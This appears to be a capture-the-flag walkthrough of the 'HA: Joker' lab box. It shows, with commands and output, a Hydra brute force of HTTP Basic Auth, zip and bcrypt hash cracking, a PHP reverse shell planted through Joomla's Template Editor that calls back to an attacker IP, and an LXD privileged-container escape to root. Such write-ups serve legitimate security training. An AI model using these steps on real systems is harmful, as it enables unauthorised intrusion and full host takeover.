HA: Joker, a Joomla credential chain to an LXD container escape

Two web ports, two very different postures: one wide open, one locked behind HTTP Basic Auth that still leaks its own CMS identity through robots.txt. From there, a cracked zip, a cracked bcrypt hash, a template-editor shell, and a well-known container group that hands over root.

Room: HA: Joker Category: Web / Linux Privesc Tools: Hydra, Nikto, zip2john, John the Ripper

The setup: a box running Joomla behind HTTP Basic Auth on a non-standard port, with a plain unauthenticated site on port 80 alongside it. The job: find a way through the auth layer, get admin access to Joomla, and escalate from a web shell to root.

No flag appears in these notes, the credential chain is the interesting part.

The Investigation

1
Spot two web ports with very different postures

A service scan shows SSH, a plain Apache site on 80, and a second Apache instance on 8080 that immediately demands HTTP Basic Auth:

22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.29
| http-auth:
|   HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-title: 401 Unauthorized
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Port 8080 responds 401 Unauthorized to everything, with a generic realm message, no obvious hint yet about what's actually running behind it.

Why this works

Two web services on the same box rarely exist in isolation from each other. The plain, unauthenticated port 80 site is worth enumerating first, it may describe or link to what's sitting behind the locked one.

2
Enumerate the open port first

A directory brute force against port 80 turns up a couple of useful loose ends alongside the expected noise:

gobuster dir -u http://10.10.13.152 -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt

/.htaccess.php         (Status: 403) [Size: 277]
/css                    (Status: 301) [Size: 310] [--> http://10.10.13.152/css/]
/img                    (Status: 301) [Size: 310] [--> http://10.10.13.152/img/]
/index.html             (Status: 200) [Size: 5954]
/phpinfo.php            (Status: 200) [Size: 94764]
/secret.txt             (Status: 200) [Size: 320]
/server-status          (Status: 403) [Size: 277]

/secret.txt and /phpinfo.php both return 200, worth noting even before it's clear whether either feeds into the real path forward.

Why this works

Not every discovered path turns into the exploit chain, some are just context. Logging them anyway means they're available later if the main path stalls.

3
Let robots.txt identify the locked app, then brute-force it

Basic Auth protects every path on port 8080 except, as it turns out, /robots.txt. Fetching it anonymously works:

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/

That's a Joomla installation's default robots file almost verbatim, including the standard header comment about moving it if Joomla isn't installed at the site root. The app behind the login prompt is now known without ever authenticating to it.

With a username guessed from context (joker, matching the room and site branding) and a wordlist, Hydra brute-forces the Basic Auth directly:

hydra 10.10.13.152 -s 8080 -l joker -P /usr/share/wordlists/rockyou.txt -f http-get

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[8080][http-get] host: 10.10.13.152   login: joker   password: hannah
Why this works

Authentication layers frequently forget that a handful of default, well-known paths (robots.txt, favicon files, default CMS assets) tend to stay excluded from the auth rule, intentionally or not, and those defaults can fingerprint the exact software running behind the lock.

4
Let an authenticated scanner find what manual enumeration might miss

With working credentials, Nikto can now crawl everything that was previously locked away:

nikto -h http://10.10.13.152:8080/ -id joker:hannah

Entry '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
Entry '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
"robots.txt" contains 14 entries which should be manually viewed.
Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37).
/backup.zip: Potentially interesting archive/cert file found.

/backup.zip, flagged directly as a potentially interesting archive.

Why this works

An authenticated scan sees an entirely different attack surface than an anonymous one. Once credentials exist for a Basic Auth layer, re-running the same enumeration tools with them attached is worth doing, not just moving straight to the login page.

5
Crack two layers of credentials

The backup archive is itself password-protected, zip2john extracts a crackable hash from it for John the Ripper, recovering the zip's own password and unlocking its contents: a full Joomla database dump.

Reading the dump directly turns up the admin account's password hash in plain SQL:

LOCK TABLES `cc1gr_users` WRITE;
/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com',
'$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:13',
'2019-10-25 13:20:02','0',...);
/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
UNLOCK TABLES;

It's bcrypt, slower to crack than a fast hash, but still beatable against a weak, common password:

john --wordlist=/usr/share/wordlists/rockyou.txt hash

Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
abcd1234         (?)

The Joomla admin account's real password, abcd1234, comes back in seconds.

Why this works

Every layer of this archive, the zip password and the database hash inside it, ultimately comes down to password strength. A weak password at any single layer collapses the whole chain, regardless of how strong the encryption or hashing algorithm protecting it actually is.

6
Get code execution through the Template Editor

Logged into the Joomla admin panel (admin:abcd1234) at 10.10.13.152:8080/administrator/, Extensions > Templates > Templates opens the active template's source files directly in a web-based code editor. Editing shell.php inside the protostar template and pasting in the pentestmonkey PHP reverse shell, pointed at the attack box, then hitting Save:

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.2.57.21';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

writes that shell straight to a predictable, publicly reachable path. With a listener running, requesting that path in a browser triggers it:

nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.2.57.21] from (UNKNOWN) [10.10.13.152] 38686
Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 14:17:49 up 3:39,  0 users,  load average: 0.00, 0.00, 0.00
www-data@ubuntu:/$ whoami
www-data

(browsing to http://10.10.13.152:8080/templates/protostar/shell.php is what triggers it)

Why this works

Joomla's Template Editor is functionally a built-in, authenticated file-write primitive onto the live web root. Any admin account, however it was obtained, can turn that editor into code execution with nothing more than pasting in a shell and saving.

7
Spot the privesc path in the shell's own group membership

A quick id right after landing the shell is often the single most useful first command, and here it's immediately telling:

www-data@ubuntu:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)

Membership in the lxd group is a well-known, direct path to root: any account in that group can create and configure LXD containers, and LXD containers can be configured to mount the entire host filesystem with root privileges.

Why this works

Group membership is a privilege boundary just as real as file permissions, and lxd/lxc group membership specifically is equivalent to root on most default LXD installs, because the daemon trusts anyone in that group to configure containers however they like, security options included.

8
Build and deploy a privileged container to break out to root

The target can't compile the Alpine image itself, so that step happens on a separate attack box instead:

git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

The resulting image transfers to the target, imports into LXD, and starts as a privileged container with the entire host filesystem mounted inside it:

www-data@ubuntu:/tmp$ lxc image import alpine-v3.12-x86_64-20200623_1255.tar.gz --alias myalpine
www-data@ubuntu:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+---------+
| ALIAS   | FINGERPRINT  | PUBLIC | DESCRIPTION                   | ARCH   | SIZE    |
+---------+--------------+--------+-------------------------------+--------+---------+
| myalpine| f3c94a02e9d8 | no     | alpine v3.12 (20200623_12:55) | x86_64 | 3.07MB  |
+---------+--------------+--------+-------------------------------+--------+---------+

www-data@ubuntu:/tmp$ lxc init myalpine joker -c security.privileged=true
Creating joker
www-data@ubuntu:/tmp$ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to joker
www-data@ubuntu:/tmp$ lxc start joker
www-data@ubuntu:/tmp$ lxc exec joker /bin/sh
~ # id
uid=0(root) gid=0(root)

Root, with the entire host filesystem readable and writable from /mnt/root.

Why this works

A security.privileged=true container isn't meaningfully isolated from its host at all, root inside the container is root on the host, and mounting the host's own root filesystem into it makes that explicit. The whole chain from lxd group membership to a root shell is a handful of standard LXD commands, no exploit code required.

Full Attack Chain

nmap: port 80 open, port 8080 behind Basic Auth
  → gobuster on :80: /secret.txt, /phpinfo.php noted
       → robots.txt on :8080 (unauthenticated): identifies Joomla
            → Hydra brute-forces Basic Auth: joker:hannah
                 → Nikto (authenticated): /backup.zip found
                      → zip2john + john: zip password cracked
                           → Joomla DB dump reveals an admin bcrypt hash
                                → john cracks it: real admin credentials
                                     → Template Editor: PHP shell saved and triggered
                                          → www-data shell, lxd group membership spotted
                                               → Privileged Alpine LXD container built and started
                                                    → Host filesystem mounted inside, root achieved

Takeaways

A locked front door doesn't mean a locked house

HTTP Basic Auth protecting every path except a default file like robots.txt was enough to identify the exact CMS running behind it, without ever authenticating.

An admin panel's legitimate features are often the easiest shell

Joomla's Template Editor needed no vulnerability at all, just valid admin credentials and the willingness to paste code into a built-in file editor.

lxd/lxc group membership should be treated as root

This isn't an edge case or a misconfiguration specific to this box, it's how LXD group permissions work by design on most default installs. Any account added to that group for convenience is a root-equivalent account.
